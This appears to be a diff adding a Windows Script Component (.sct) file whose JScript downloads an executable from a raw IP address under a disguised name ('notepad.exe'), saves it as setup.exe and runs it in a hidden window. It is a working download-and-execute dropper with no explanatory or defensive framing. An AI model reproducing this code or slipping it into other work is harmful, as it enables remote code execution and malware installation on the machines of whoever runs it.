@@ -1,0 +1,36 @@
+<?xml version="1.0"?>
+<component>
+
+<?component error="true" debug="false"?>
+
+<script language="JScript">
+<![CDATA[
+
+function getFile(strURL){
+    var strResult;
+    
+    try{
+        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1")
+        WinHttpReq.Open("GET",strURL,false);
+        WinHttpReq.Send();
+        WinHttpReq.WaitForResponse();
+        strResult = WinHttpReq.ResponseBody;
+    }
+    catch (objError){}
+    return strResult;
+}
+
+var s=new ActiveXObject("ADODB.Stream");
+s.Mode=3;
+s.Type=1;
+s.Open();
+s.Write(getFile("http://45.32.62.213/notepad.exe"));
+s.SaveToFile("..\\setup.exe",2);
+s.Close();
+
+new ActiveXObject("WScript.Shell").Run("..\\setup.exe",0,true);
+
+]]>
+</script>
+
+</component>
